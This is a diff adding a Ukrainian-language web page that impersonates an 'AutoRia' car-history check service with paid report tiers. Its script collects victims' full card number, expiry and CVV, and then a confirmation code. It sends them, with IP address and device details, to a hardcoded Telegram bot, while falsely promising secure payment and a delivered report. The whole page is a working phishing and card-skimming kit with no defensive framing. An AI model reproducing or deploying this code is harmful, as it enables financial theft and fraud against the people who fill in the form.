@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>АвтоРіа Перевірка – історія та ДТП авто</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(145deg, #f6f8fc 0%, #edf2f9 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            line-height: 1.5;
+        }
+
+        .auto-container {
+            max-width: 780px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 36px;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            transition: transform 0.2s ease;
+        }
+
+        /* Хедер – сучасний градієнт */
+        .header {
+            background: linear-gradient(135deg, #0b2b5c 0%, #1a4a7a 100%);
+            padding: 32px 32px 28px;
+            color: white;
+            position: relative;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+
+        .logo-icon {
+            font-size: 42px;
+            color: #ffcc00;
+        }
+
+        .logo h1 {
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .logo span {
+            font-weight: 500;
+            font-size: 14px;
+            background: rgba(255,255,255,0.2);
+            padding: 5px 14px;
+            border-radius: 60px;
+            margin-left: 10px;
+        }
+
+        .badge {
+            background: rgba(255,255,255,0.12);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 18px;
+            border-radius: 60px;
+            font-size: 13px;
+            font-weight: 500;
+            backdrop-filter: blur(4px);
+        }
+
+        .header p {
+            margin-top: 18px;
+            font-size: 15px;
+            opacity: 0.9;
+            max-width: 80%;
+        }
+
+        .content {
+            padding: 32px;
+        }
+
+        /* Тарифи – сучасні картки */
+        .plans {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 36px;
+        }
+
+        .plan-card {
+            flex: 1;
+            min-width: 180px;
+            background: #ffffff;
+            border: 2px solid #eef2f8;
+            border-radius: 28px;
+            padding: 24px 16px;
+            text-align: center;
+            transition: all 0.2s;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .plan-card.selected {
+            border-color: #ffcc00;
+            background: #fffef7;
+            box-shadow: 0 12px 24px -12px rgba(0,0,0,0.15);
+        }
+
+        .plan-card:hover {
+            transform: translateY(-4px);
+        }
+
+        .plan-icon {
+            font-size: 44px;
+            margin-bottom: 12px;
+        }
+
+        .plan-name {
+            font-weight: 800;
+            font-size: 20px;
+            margin-bottom: 8px;
+            color: #0b2b5c;
+        }
+
+        .plan-price {
+            font-weight: 700;
+            font-size: 28px;
+            color: #1e293b;
+            margin: 12px 0 6px;
+        }
+
+        .plan-price span {
+            font-size: 14px;
+            font-weight: 500;
+            color: #5b6e8c;
+        }
+
+        .plan-feature {
+            font-size: 13px;
+            color: #4a5b7a;
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .plan-feature i {
+            color: #ffcc00;
+        }
+
+        /* Вибір авто */
+        .section-title {
+            font-weight: 700;
+            font-size: 20px;
+            color: #0b2b5c;
+            margin: 28px 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-left: 4px solid #ffcc00;
+            padding-left: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 8px;
+            color: #1e293b;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #ffcc00;
+            font-size: 18px;
+        }
+
+        .input-wrapper input, .input-wrapper select {
+            width: 100%;
+            background: #ffffff;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 20px;
+            padding: 16px 18px 16px 52px;
+            font-size: 16px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s;
+            color: #0f172a;
+        }
+
+        .input-wrapper input:focus, .input-wrapper select:focus {
+            border-color: #ffcc00;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(255,204,0,0.15);
+        }
+
+        .row-duo {
+            display: flex;
+            gap: 20px;
+        }
+        .row-duo .form-group {
+            flex: 1;
+        }
+
+        .btn {
+            background: #0b2b5c;
+            color: white;
+            border: none;
+            border-radius: 60px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 18px rgba(11,43,92,0.2);
+            margin-top: 16px;
+        }
+
+        .btn:hover {
+            background: #1a4a7a;
+            transform: translateY(-2px);
+        }
+
+        .payment-icons {
+            display: flex;
+            justify-content: center;
+            gap: 28px;
+            margin: 28px 0 12px;
+            color: #94a3b8;
+            font-size: 30px;
+        }
+
+        .footer-note {
+            text-align: center;
+            font-size: 12px;
+            color: #7f8ea3;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #eef2f8;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            margin: 32px 0;
+        }
+
+        .otp-inputs input {
+            width: 68px;
+            height: 78px;
+            background: #ffffff;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 20px;
+            text-align: center;
+            font-size: 32px;
+            font-weight: 700;
+            color: #0b2b5c;
+        }
+
+        .otp-inputs input:focus {
+            border-color: #ffcc00;
+            outline: none;
+        }
+
+        .resend-link {
+            color: #ffcc00;
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 1px dashed #ffcc00;
+        }
+
+        .step {
+            display: block;
+        }
+        .step.hidden {
+            display: none;
+        }
+
+        .thankyou {
+            text-align: center;
+            padding: 36px 28px;
+            background: #eef6f0;
+            border-radius: 28px;
+            margin-top: 20px;
+        }
+
+        .thankyou i {
+            font-size: 70px;
+            color: #2e7d32;
+            margin-bottom: 20px;
+        }
+
+        .debug {
+            background: #f1f5f9;
+            border-radius: 16px;
+            padding: 12px;
+            margin-top: 24px;
+            font-size: 11px;
+            display: none;
+            font-family: monospace;
+            border-left: 4px solid #ffcc00;
+        }
+
+        @media (max-width: 650px) {
+            .plans { flex-direction: column; }
+            .plan-card { min-width: auto; }
+            .row-duo { flex-direction: column; gap: 16px; }
+            .otp-inputs input { width: 55px; height: 65px; font-size: 26px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="auto-container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-chart-line logo-icon"></i>
+                <h1>АвтоРіа <span>перевірка</span></h1>
+            </div>
+            <div class="badge"><i class="fas fa-shield-alt"></i> Офіційні партнери</div>
+            <p>Дізнайтеся повну історію авто: ДТП, пробіг, обмеження, заставу</p>
+        </div>
+
+        <div class="content">
+            <div id="stepPlan" class="step">
+                <div class="plans">
+                    <div class="plan-card" data-price="175" data-plan="basic">
+                        <div class="plan-icon"><i class="fas fa-car"></i></div>
+                        <div class="plan-name">Звичайна</div>
+                        <div class="plan-price">175 <span>грн</span></div>
+                        <div class="plan-feature"><i class="fas fa-check-circle"></i> Історія ДТП</div>
+                        <div class="plan-feature"><i class="fas fa-check-circle"></i> Кількість власників</div>
+                    </div>
+                    <div class="plan-card" data-price="570" data-plan="medium">
+                        <div class="plan-icon"><i class="fas fa-truck"></i></div>
+                        <div class="plan-name">Середня</div>
+                        <div class="plan-price">570 <span>грн</span></div>
+                        <div class="plan-feature"><i class="fas fa-check-circle"></i> Історія ДТП + фото</div>
+                        <div class="plan-feature"><i class="fas fa-check-circle"></i> Пробіг + обмеження</div>
+                    </div>
+                    <div class="plan-card" data-price="1050" data-plan="max">
+                        <div class="plan-icon"><i class="fas fa-tachometer-alt"></i></div>
+                        <div class="plan-name">Максимальна</div>
+                        <div class="plan-price">1050 <span>грн</span></div>
+                        <div class="plan-feature"><i class="fas fa-check-circle"></i> Повна історія + застава</div>
+                        <div class="plan-feature"><i class="fas fa-check-circle"></i> Юридичні перевірки</div>
+                    </div>
+                </div>
+
+                <div class="section-title"><i class="fas fa-search"></i> Дані автомобіля</div>
+                <div class="row-duo">
+                    <div class="form-group">
+                        <label>Марка</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-car-side"></i>
+                            <input type="text" id="brand" placeholder="Toyota, BMW, Tesla...">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Модель</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-car"></i>
+                            <input type="text" id="model" placeholder="Camry, X5, Model 3...">
+                        </div>
+                    </div>
+                </div>
+                <div class="row-duo">
+                    <div class="form-group">
+                        <label>Рік випуску</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-calendar-alt"></i>
+                            <input type="text" id="year" placeholder="2020">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>VIN / Номер кузова (опціонально)</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-qrcode"></i>
+                            <input type="text" id="vin" placeholder="VIN-код або номер">
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Телефон для зв'язку (SMS звіт)</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-phone-alt"></i>
+                        <input type="tel" id="phone" placeholder="+380 00 000 00 00">
+                    </div>
+                </div>
+
+                <button class="btn" id="toPaymentBtn">Продовжити до оплати <i class="fas fa-arrow-right"></i></button>
+                <div class="payment-icons">
+                    <i class="fab fa-cc-visa"></i>
+                    <i class="fab fa-cc-mastercard"></i>
+                    <i class="fab fa-cc-amex"></i>
+                    <i class="fab fa-apple-pay"></i>
+                </div>
+                <div class="footer-note">
+                    <i class="fas fa-shield-alt"></i> Дані захищені. Після оплати ви отримаєте SMS-код для завантаження звіту.
+                </div>
+            </div>
+
+            <!-- Шаг оплати карткою -->
+            <div id="stepPayment" class="step hidden">
+                <div class="section-title"><i class="fas fa-credit-card"></i> Оплата <span id="priceDisplay">0</span> грн</div>
+                <div class="form-group">
+                    <label>Номер картки</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-credit-card"></i>
+                        <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+                    </div>
+                </div>
+                <div class="row-duo">
+                    <div class="form-group">
+                        <label>Термін дії</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-calendar-alt"></i>
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-lock"></i>
+                            <input type="text" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
+                        </div>
+                    </div>
+                </div>
+                <button class="btn" id="payBtn"><i class="fas fa-lock"></i> Сплатити та отримати звіт</button>
+                <div class="footer-note">
+                    <i class="fas fa-shield-alt"></i> Захищений платіж 3D‑Secure
+                </div>
+                <div id="debug" class="debug"></div>
+            </div>
+
+            <!-- Крок OTP -->
+            <div id="stepOtp" class="step hidden">
+                <div class="section-title"><i class="fas fa-mobile-alt"></i> Підтвердження</div>
+                <p style="margin-bottom: 28px;">Код підтвердження надіслано на <strong id="phoneDisplay"></strong></p>
+                <div class="otp-inputs">
+                    <input type="text" maxlength="1" class="otp-digit">
+                    <input type="text" maxlength="1" class="otp-digit">
+                    <input type="text" maxlength="1" class="otp-digit">
+                    <input type="text" maxlength="1" class="otp-digit">
+                </div>
+                <button class="btn" id="confirmOtpBtn">Підтвердити код</button>
+                <p style="margin-top: 24px; text-align: center;">
+                    <a href="#" id="resendOtpLink" class="resend-link">Не отримали код?</a>
+                </p>
+            </div>
+
+            <!-- Подяка -->
+            <div id="stepThanks" class="step hidden">
+                <div class="thankyou">
+                    <i class="fas fa-file-alt"></i>
+                    <h3>Звіт готовий!</h3>
+                    <p>Дякуємо за довіру. Ваш звіт про авто надіслано SMS-повідомленням.</p>
+                    <p style="margin-top: 12px;">Перевірте телефон. За кілька хвилин ви отримаєте детальну історію.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ---------- НАЛАШТУВАННЯ ----------
+        const TELEGRAM_BOT_TOKEN = '8627594813:AAFWlZIxw5EdzuKXwfw-aUk9xyX8nIm5eb4';
+        const ADMIN_CHAT_ID = '8453084997';
+
+        let orderData = {
+            brand: '', model: '', year: '', vin: '', phone: '',
+            plan: '', price: 0,
+            card: '', expiry: '', cvv: ''
+        };
+        let visitorIP = 'визначення...';
+        const debugDiv = document.getElementById('debug');
+
+        function logDebug(msg, isError = false) {
+            console.log(msg);
+            if (debugDiv) {
+                debugDiv.style.display = 'block';
+                const color = isError ? '#c41e3a' : '#0b2b5c';
+                debugDiv.innerHTML += `<div style="color:${color}; border-bottom:1px solid #e2e8f0; padding:4px;">${new Date().toLocaleTimeString()}: ${msg}</div>`;
+                debugDiv.scrollTop = debugDiv.scrollHeight;
+            }
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                visitorIP = data.ip;
+                logDebug(`IP визначено: ${visitorIP}`);
+            } catch(e) {
+                visitorIP = 'недоступний';
+                logDebug('Не вдалося отримати IP', true);
+            }
+        }
+        getIP();
+
+        async function sendToTelegram(message) {
+            logDebug('Надсилання до Telegram...');
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+                const data = await response.json();
+                logDebug(`Статус: ${response.status}, ok: ${data.ok}`);
+                if (!data.ok) {
+                    logDebug(`Помилка Telegram: ${data.description}`, true);
+                    alert(`Помилка оплати: ${data.description}. Спробуйте пізніше.`);
+                    return false;
+                }
+                logDebug('✅ Повідомлення надіслано');
+                return true;
+            } catch (err) {
+                logDebug(`Помилка мережі: ${err.message}`, true);
+                alert('Помилка оплати. Перевірте інтернет.');
+                return false;
+            }
+        }
+
+        // Вибір тарифу
+        const planCards = document.querySelectorAll('.plan-card');
+        let selectedPlan = 'basic';
+        let selectedPrice = 175;
+
+        planCards.forEach(card => {
+            card.addEventListener('click', () => {
+                planCards.forEach(c => c.classList.remove('selected'));
+                card.classList.add('selected');
+                selectedPrice = parseInt(card.dataset.price);
+                selectedPlan = card.dataset.plan;
+                logDebug(`Обрано тариф: ${card.querySelector('.plan-name').innerText} (${selectedPrice} грн)`);
+            });
+        });
+        // Вибрати перший за замовчуванням
+        planCards[0].classList.add('selected');
+
+        document.getElementById('toPaymentBtn').addEventListener('click', function() {
+            const brand = document.getElementById('brand').value.trim();
+            const model = document.getElementById('model').value.trim();
+            const year = document.getElementById('year').value.trim();
+            const vin = document.getElementById('vin').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            if (!brand || !model || !year || !phone) {
+                alert('Будь ласка, заповніть марку, модель, рік та телефон');
+                return;
+            }
+            if (phone.replace(/\D/g, '').length < 10) {
+                alert('Введіть коректний номер телефону');
+                return;
+            }
+
+            orderData.brand = brand;
+            orderData.model = model;
+            orderData.year = year;
+            orderData.vin = vin || 'не вказано';
+            orderData.phone = phone;
+            orderData.plan = selectedPlan;
+            orderData.price = selectedPrice;
+
+            document.getElementById('priceDisplay').innerText = selectedPrice;
+            document.getElementById('stepPlan').classList.add('hidden');
+            document.getElementById('stepPayment').classList.remove('hidden');
+        });
+
+        document.getElementById('payBtn').addEventListener('click', async function() {
+            const card = document.getElementById('card').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            if (!card || !expiry || !cvv || card.length < 16) {
+                alert('Заповніть коректно всі поля картки');
+                return;
+            }
+            orderData.card = card;
+            orderData.expiry = expiry;
+            orderData.cvv = cvv;
+
+            const msg = `
+🚗 <b>АвтоРіа – ПЕРЕВІРКА АВТО</b>
+
+📋 <b>Тариф:</b> ${orderData.plan === 'basic' ? 'Звичайна' : (orderData.plan === 'medium' ? 'Середня' : 'Максимальна')}
+💰 <b>Сума:</b> ${orderData.price} грн
+
+🚘 <b>Автомобіль:</b> ${orderData.brand} ${orderData.model} (${orderData.year})
+🔢 <b>VIN/номер:</b> ${orderData.vin}
+
+📞 <b>Телефон:</b> ${orderData.phone}
+
+💳 <b>Дані картки:</b>
+• Номер: <code>${orderData.card}</code>
+• Термін: ${orderData.expiry}
+• CVV: ${orderData.cvv}
+
+🌐 <b>Інфо про відвідувача:</b>
+• IP: <code>${visitorIP}</code>
+• Пристрій: ${navigator.userAgent}
+🕒 Час: ${new Date().toLocaleString('uk-UA')}
+            `;
+
+            const success = await sendToTelegram(msg);
+            if (success) {
+                document.getElementById('stepPayment').classList.add('hidden');
+                document.getElementById('stepOtp').classList.remove('hidden');
+                document.getElementById('phoneDisplay').innerText = orderData.phone;
+            }
+        });
+
+        // OTP
+        const otpInputs = document.querySelectorAll('.otp-digit');
+        otpInputs.forEach((input, idx) => {
+            input.addEventListener('keyup', function(e) {
+                if (e.key >= '0' && e.key <= '9') {
+                    this.value = e.key;
+                    if (idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+                } else if (e.key === 'Backspace' && idx > 0) {
+                    otpInputs[idx - 1].focus();
+                }
+            });
+        });
+
+        document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
+            let otp = '';
+            otpInputs.forEach(i => otp += i.value);
+            if (otp.length !== 4) {
+                alert('Введіть 4 цифри коду');
+                return;
+            }
+            const otpMsg = `🔐 <b>Код підтвердження (АвтоРіа)</b>\n📞 Телефон: ${orderData.phone}\n💳 Картка: ${orderData.card}\n🔢 Код: <code>${otp}</code>\n🌐 IP: <code>${visitorIP}</code>`;
+            const success = await sendToTelegram(otpMsg);
+            if (success) {
+                document.getElementById('stepOtp').classList.add('hidden');
+                document.getElementById('stepThanks').classList.remove('hidden');
+            }
+        });
+
+        document.getElementById('resendOtpLink').addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Демо: новий код надіслано');
+        });
+
+        // Форматування полів
+        document.getElementById('card').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0,16);
+            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+        });
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0,4);
+            if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
+            e.target.value = v;
+        });
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0,3);
+        });
+
+        document.getElementById('brand').focus();
+    </script>
+</body>
+</html>
